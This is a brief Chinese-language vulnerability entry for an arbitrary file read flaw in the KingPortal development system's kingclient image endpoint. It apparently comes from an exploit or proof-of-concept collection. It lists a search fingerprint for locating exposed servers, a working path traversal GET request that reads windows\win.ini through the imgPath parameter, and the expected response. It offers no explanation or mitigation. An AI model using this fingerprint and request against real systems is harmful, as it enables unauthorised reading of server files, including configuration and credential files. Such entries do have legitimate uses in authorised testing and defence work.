# KingPortal开发系统kingclient任意文件读取漏洞

KingPortal ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/public/javascripts/Common/Util/km_util.js"`
- **请求**：`GET /kingclient/img?imgPath=..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini HTTP/1.1`
- **响应特征**：200 [Mail]